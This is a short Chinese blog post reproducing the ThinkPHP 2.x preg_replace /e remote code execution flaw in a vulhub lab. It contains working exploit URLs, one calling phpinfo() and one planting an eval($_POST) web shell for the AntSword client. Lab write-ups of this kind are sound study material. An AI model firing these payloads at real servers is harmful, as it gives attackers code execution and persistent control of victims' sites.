---
title: ThinkPHP 2.x 任意代码执行漏洞
date: 2020-06-13 15:48:27
categories: 漏洞复现
tags: ThinkPHP
---

#### 背景

ThinkPHP 2.x版本中，使用`preg_replace`的`/e`模式匹配路由：

```php
$res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));
```

导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。

ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞。

<!--more-->

#### 复现过程

1.使用如下POC可查看phpinfo信息

```
http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D
```



![](http://qn.laohuan.xin/2020-06-13_15-57-09.png)





2.使用蚁剑连接

```
http://IP:8080/index.php?s=/index/index/name/${@print%28eval%28$_POST[1234]%29%29}
```



![](http://qn.laohuan.xin/2020-06-13_16-15-37.png)

3.url编码

* %7B: {
* %7D: }
* %28: (
* %29: )

#### 参考链接

<http://github.com/vulhub/vulhub/tree/master/thinkphp/2-rce/>